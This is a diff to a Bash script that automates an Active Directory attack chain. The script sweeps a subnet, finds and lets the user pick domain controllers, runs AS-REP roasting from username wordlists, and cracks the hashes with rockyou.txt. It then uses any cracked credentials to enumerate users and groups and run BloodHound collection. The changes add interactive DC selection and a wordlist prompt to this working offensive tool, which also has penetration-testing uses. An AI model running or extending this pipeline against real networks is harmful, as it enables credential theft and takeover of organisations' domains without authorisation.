@@ -146,6 +146,195 @@ find_dcs() {
 }
 
 # ------------------------------------------------------------
+# Phase 2.5: Interactive DC selection (multi-select)
+# ------------------------------------------------------------
+select_dcs() {
+    local dclist="$1"          # file containing DC IPs
+    local outfile="$2"         # where to write selected DCs
+
+    mapfile -t DCS < "$dclist"
+
+    if [[ ${#DCS[@]} -eq 0 ]]; then
+        echo "[!] No DC candidates to select." >&2
+        return 1
+    fi
+
+    # Non-interactive: take all
+    if [[ ! -t 0 ]]; then
+        cp "$dclist" "$outfile"
+        return 0
+    fi
+
+    echo
+    echo "────────────────────────────────────────" >&2
+    echo " DC CANDIDATES" >&2
+    echo "────────────────────────────────────────" >&2
+    local idx=1
+    for dc in "${DCS[@]}"; do
+        printf "  %2d) %s\n" "$idx" "$dc" >&2
+        ((idx++))
+    done
+    echo "────────────────────────────────────────" >&2
+    echo "  a) ALL" >&2
+    echo "────────────────────────────────────────" >&2
+
+    local choice
+    while :; do
+        read -rp "[?] Select DCs (e.g. 1,3,5 or 'a' for all): " choice
+
+        # Trim whitespace
+        choice="${choice#"${choice%%[![:space:]]*}"}"
+        choice="${choice%"${choice##*[![:space:]]}"}"
+        choice="${choice// /}"
+
+        if [[ "$choice" =~ ^[aA]$ ]]; then
+            cp "$dclist" "$outfile"
+            echo "[*] Selected ALL DCs." >&2
+            return 0
+        fi
+
+        if [[ "$choice" =~ ^[0-9]+(,[0-9]+)*$ ]]; then
+            local valid=1
+            local sel=()
+            IFS=',' read -ra nums <<< "$choice"
+            for n in "${nums[@]}"; do
+                if (( n >= 1 && n <= ${#DCS[@]} )); then
+                    sel+=("${DCS[$((n-1))]}")
+                else
+                    echo "    [!] Invalid index: $n" >&2
+                    valid=0
+                    break
+                fi
+            done
+            if (( valid )); then
+                printf "%s\n" "${sel[@]}" | sort -u > "$outfile"
+                echo "[*] Selected $(wc -l < "$outfile") DC(s)." >&2
+                return 0
+            fi
+        fi
+
+        echo "    [!] Invalid selection. Try again." >&2
+    done
+}
+
+# ------------------------------------------------------------
+# Phase 2.6: Prompt for username wordlist (post-DC-select)
+#
+# Sets global PROMPTED_WORDLIST. Prints all UI to stderr.
+# Never call via $(...) — invoke directly.
+# ------------------------------------------------------------
+prompt_wordlist() {
+    local current="$1"
+    PROMPTED_WORDLIST=""
+
+    # If already provided via -w, keep it (validate it exists)
+    if [[ -n "$current" ]]; then
+        if [[ -f "$current" && -r "$current" && -s "$current" ]]; then
+            PROMPTED_WORDLIST="$current"
+            return 0
+        else
+            echo "[!] -w wordlist not found/unreadable/empty: $current" >&2
+            echo "[!] Falling back to interactive prompt..." >&2
+        fi
+    fi
+
+    # Non-interactive (piped stdin): try common defaults, else skip
+    if [[ ! -t 0 ]]; then
+        for candidate in \
+            /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+            /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt \
+            /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
+        do
+            if [[ -f "$candidate" && -s "$candidate" ]]; then
+                PROMPTED_WORDLIST="$candidate"
+                return 0
+            fi
+        done
+        PROMPTED_WORDLIST=""
+        return 0
+    fi
+
+    # Interactive: primary choice is a custom path
+    local d1="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
+    local d2="/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
+    local have_defaults=0
+    [[ -f "$d1" ]] && have_defaults=1
+    [[ -f "$d2" ]] && have_defaults=1
+
+    echo "" >&2
+    echo "────────────────────────────────────────" >&2
+    echo " USERNAME WORDLIST (for AS-REP roasting)" >&2
+    echo "────────────────────────────────────────" >&2
+    echo " Enter the full path to your username wordlist," >&2
+    echo " or type one of the shortcuts below:" >&2
+    echo "" >&2
+    echo "   skip   → skip AS-REP roasting entirely" >&2
+    echo "   auto   → use a detected seclists default (if available)" >&2
+    echo "────────────────────────────────────────" >&2
+
+    # Show detected defaults if they exist (informational only)
+    if (( have_defaults )); then
+        [[ -f "$d1" ]] && echo "   [auto: $d1]" >&2
+        [[ -f "$d2" ]] && echo "   [auto: $d2]" >&2
+    fi
+    echo "" >&2
+
+    local input
+    while :; do
+        # Read from the terminal directly; prompt goes to stderr.
+        read -rp "[?] Username wordlist path: " input < /dev/tty
+
+        # Trim whitespace
+        input="${input#"${input%%[![:space:]]*}"}"
+        input="${input%"${input##*[![:space:]]}"}"
+
+        # Empty → re-prompt
+        if [[ -z "$input" ]]; then
+            echo "    [!] Empty input. Enter a path, 'skip', or 'auto'." >&2
+            continue
+        fi
+
+        # Skip AS-REP
+        if [[ "$input" =~ ^[sS][kK][iI][pP]$ ]]; then
+            echo "[*] Skipping AS-REP roasting." >&2
+            PROMPTED_WORDLIST=""
+            return 0
+        fi
+
+        # Auto-pick a detected default
+        if [[ "$input" =~ ^[aA][uU][tT][oO]$ ]]; then
+            if (( have_defaults )); then
+                for candidate in "$d1" "$d2"; do
+                    if [[ -f "$candidate" && -s "$candidate" ]]; then
+                        echo "[*] Using auto-selected wordlist: $candidate" >&2
+                        PROMPTED_WORDLIST="$candidate"
+                        return 0
+                    fi
+                done
+            fi
+            echo "    [!] No seclists defaults found on this system." >&2
+            continue
+        fi
+
+        # Expand ~ manually (read doesn't do it)
+        input="${input/#\~/$HOME}"
+
+        # Treat as a file path
+        if [[ -f "$input" && -r "$input" ]]; then
+            if [[ ! -s "$input" ]]; then
+                echo "    [!] File is empty: $input" >&2
+                continue
+            fi
+            PROMPTED_WORDLIST="$input"
+            return 0
+        fi
+
+        echo "    [!] File not found or unreadable: $input" >&2
+        echo "    [!] Enter a valid path, 'skip', or 'auto'." >&2
+    done
+}
+
+# ------------------------------------------------------------
 # Phase 3: DC recon — RootDSE, SMB null session
 # ------------------------------------------------------------
 recon_dc() {
@@ -284,15 +473,15 @@ crack_asrep() {
     else
         if [[ -t 0 ]]; then
             echo
-            echo "[?] Wordlist for cracking:"
-            echo "    1) /usr/share/wordlists/rockyou.txt (default)"
-            echo "    2) Custom path"
+            echo "[?] Wordlist for cracking:" >&2
+            echo "    1) /usr/share/wordlists/rockyou.txt (default)" >&2
+            echo "    2) Custom path" >&2
             local wl_choice
-            read -rp "[?] Select [1-2]: " wl_choice
+            read -rp "[?] Select [1-2]: " wl_choice < /dev/tty
             case "$wl_choice" in
                 2)
                     local custom_wl
-                    read -rp "[?] Enter path to wordlist: " custom_wl
+                    read -rp "[?] Enter path to wordlist: " custom_wl < /dev/tty
                     if [[ -f "$custom_wl" ]]; then
                         chosen_wordlist="$custom_wl"
                     else
@@ -621,7 +810,7 @@ Usage: $0 [-i <interface>] [-w <wordlist>] [-c <crack_wordlist>]
 
   -i <iface>            Network interface to use (skips interactive prompt)
   -w <wordlist>         Username wordlist for AS-REP roasting
-                        (default: /usr/share/seclists/Usernames/top-usernames-shortlist.txt)
+                        (if omitted, you'll be prompted after DC selection)
   -c <crack_wordlist>   Password wordlist for cracking AS-REP hashes
                         (default: /usr/share/wordlists/rockyou.txt)
 EOF
@@ -631,35 +820,15 @@ EOF
     esac
 done
 
-# Default username wordlist
-if [[ -z "$WORDLIST" ]]; then
-    for candidate in \
-        /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
-        /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt \
-        /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
-    do
-        if [[ -f "$candidate" ]]; then
-            WORDLIST="$candidate"
-            break
-        fi
-    done
-fi
-
-if [[ -z "$WORDLIST" ]]; then
-    echo "[!] No username wordlist found. Use -w to specify one." >&2
-    echo "[!] AS-REP roasting will be skipped." >&2
-fi
-
 # Interface + subnet
 IFACE=$(select_interface "$IFACE_ARG")
 SUBNET=$(cidr_for_iface "$IFACE") || { echo "[!] Could not derive CIDR."; exit 1; }
 
 echo "[*] Interface : $IFACE"
 echo "[*] Subnet    : $SUBNET"
-[[ -n "$WORDLIST" ]] && echo "[*] Wordlist  : $WORDLIST"
 echo
 
-# Phase 1
+# ---------- Phase 1: sweep ----------
 sweep_subnet "$SUBNET" "live_confirmed.txt" "live_candidates.txt"
 echo "[*] Confirmed written to live_confirmed.txt"
 echo "[*] Candidates written to live_candidates.txt"
@@ -673,85 +842,108 @@ grep -v "^${MY_IP}$" scan_targets.txt > scan_targets.tmp && mv scan_targets.tmp 
 echo "[*] Scan targets (after exclusions): $(wc -l < scan_targets.txt)"
 echo
 
-# Phase 2
-if find_dcs "scan_targets.txt" "dc_candidates.txt"; then
-    echo "[*] DC candidates written to dc_candidates.txt"
-    echo
-
-    # Phase 3: recon all DCs first
-    while read -r dc; do
-        recon_dc "$dc"
-        echo
-    done < dc_candidates.txt
-
-    # Phase 4-7: iterate per DC
-    while read -r dc; do
-        [[ -z "$dc" ]] && continue
-
-        DOMAIN=$(domain_for_dc "$dc")
-
-        echo "============================================================"
-        echo "[*] Processing DC $dc (domain: ${DOMAIN:-unknown})"
-        echo "============================================================"
-        echo
-
-        if [[ -z "$DOMAIN" ]]; then
-            echo "[!] Could not determine domain for $dc — skipping." >&2
-            echo
-            continue
-        fi
-
-        if [[ -z "$WORDLIST" ]]; then
-            echo "[!] No wordlist — skipping AS-REP roast for $dc." >&2
-            echo
-            continue
-        fi
-
-        # Phase 4: AS-REP roast
-        asrep_roast "$dc" "$DOMAIN" "$WORDLIST"
-        echo
-
-        HASHFILE="recon_${dc//./_}/asrep_all.hashes"
-        CRACKED_OUT="recon_${dc//./_}/cracked.txt"
-
-        if [[ ! -s "$HASHFILE" ]]; then
-            echo "[-] No hashes to crack for $dc — moving on." >&2
-            echo
-            continue
-        fi
-
-        # Phase 5: crack
-        crack_asrep "$HASHFILE" "$CRACK_WORDLIST"
-        echo
-
-        # Phase 6 & 7: require cracked creds
-        if [[ -s "$CRACKED_OUT" ]]; then
-            CRACKED_USER=$(parse_cracked_user "$CRACKED_OUT")
-            CRACKED_PASS=$(parse_cracked_pass "$CRACKED_OUT")
-
-            if [[ -n "$CRACKED_USER" ]] && [[ -n "$CRACKED_PASS" ]]; then
-                echo "[*] Cracked credential: ${CRACKED_USER}:${CRACKED_PASS}" >&2
-                echo
-
-                # Phase 6
-                enumerate_users_groups "$dc" "$DOMAIN" "$CRACKED_USER" "$CRACKED_PASS"
-                echo
-
-                # Phase 7
-                DC_HOSTNAME=$(resolve_dc_fqdn "$dc" "$DOMAIN")
-
-                if [[ -n "$DC_HOSTNAME" ]]; then
-                    echo "[*] DC FQDN: $DC_HOSTNAME" >&2
-                    collect_bloodhound "$dc" "$DC_HOSTNAME" "$DOMAIN" "$CRACKED_USER" "$CRACKED_PASS"
-                else
-                    echo "[!] Could not resolve DC hostname for $dc — skipping BloodHound." >&2
-                    echo "[!] Try manually: dig @$dc -x $dc" >&2
-                fi
-                echo
-            fi
-        fi
-    done < dc_candidates.txt
-else
+# ---------- Phase 2: find DCs ----------
+if ! find_dcs "scan_targets.txt" "dc_candidates.txt"; then
     echo "[!] No DCs identified. Stopping here."
     exit 1
 fi
+echo "[*] DC candidates written to dc_candidates.txt"
+echo
+
+# ---------- Phase 2.5: user picks which DCs to enumerate ----------
+select_dcs "dc_candidates.txt" "dc_selected.txt" || {
+    echo "[!] DC selection failed."
+    exit 1
+}
+
+echo
+echo "[*] DCs to enumerate:" >&2
+while read -r dc; do
+    echo "    -> $dc" >&2
+done < dc_selected.txt
+echo
+
+# ---------- Phase 2.6: prompt for username wordlist ----------
+prompt_wordlist "$WORDLIST"
+WORDLIST="$PROMPTED_WORDLIST"
+
+if [[ -n "$WORDLIST" ]]; then
+    echo "[*] Username wordlist: $WORDLIST"
+else
+    echo "[!] No username wordlist — AS-REP roasting will be skipped." >&2
+fi
+echo
+
+# ---------- Phase 3: recon selected DCs only ----------
+while read -r dc; do
+    recon_dc "$dc"
+    echo
+done < dc_selected.txt
+
+# ---------- Phase 4-7: per selected DC ----------
+while read -r dc; do
+    [[ -z "$dc" ]] && continue
+
+    DOMAIN=$(domain_for_dc "$dc")
+
+    echo "============================================================"
+    echo "[*] Processing DC $dc (domain: ${DOMAIN:-unknown})"
+    echo "============================================================"
+    echo
+
+    if [[ -z "$DOMAIN" ]]; then
+        echo "[!] Could not determine domain for $dc — skipping." >&2
+        echo
+        continue
+    fi
+
+    if [[ -z "$WORDLIST" ]]; then
+        echo "[!] No wordlist — skipping AS-REP roast for $dc." >&2
+        echo
+        continue
+    fi
+
+    # Phase 4: AS-REP roast
+    asrep_roast "$dc" "$DOMAIN" "$WORDLIST"
+    echo
+
+    HASHFILE="recon_${dc//./_}/asrep_all.hashes"
+    CRACKED_OUT="recon_${dc//./_}/cracked.txt"
+
+    if [[ ! -s "$HASHFILE" ]]; then
+        echo "[-] No hashes to crack for $dc — moving on." >&2
+        echo
+        continue
+    fi
+
+    # Phase 5: crack
+    crack_asrep "$HASHFILE" "$CRACK_WORDLIST"
+    echo
+
+    # Phase 6 & 7: require cracked creds
+    if [[ -s "$CRACKED_OUT" ]]; then
+        CRACKED_USER=$(parse_cracked_user "$CRACKED_OUT")
+        CRACKED_PASS=$(parse_cracked_pass "$CRACKED_OUT")
+
+        if [[ -n "$CRACKED_USER" ]] && [[ -n "$CRACKED_PASS" ]]; then
+            echo "[*] Cracked credential: ${CRACKED_USER}:${CRACKED_PASS}" >&2
+            echo
+
+            # Phase 6
+            enumerate_users_groups "$dc" "$DOMAIN" "$CRACKED_USER" "$CRACKED_PASS"
+            echo
+
+            # Phase 7
+            DC_HOSTNAME=$(resolve_dc_fqdn "$dc" "$DOMAIN")
+
+            if [[ -n "$DC_HOSTNAME" ]]; then
+                echo "[*] DC FQDN: $DC_HOSTNAME" >&2
+                collect_bloodhound "$dc" "$DC_HOSTNAME" "$DOMAIN" "$CRACKED_USER" "$CRACKED_PASS"
+            else
+                echo "[!] Could not resolve DC hostname for $dc — skipping BloodHound." >&2
+                echo "[!] Try manually: dig @$dc -x $dc" >&2
+            fi
+            echo
+        fi
+    fi
+done < dc_selected.txt
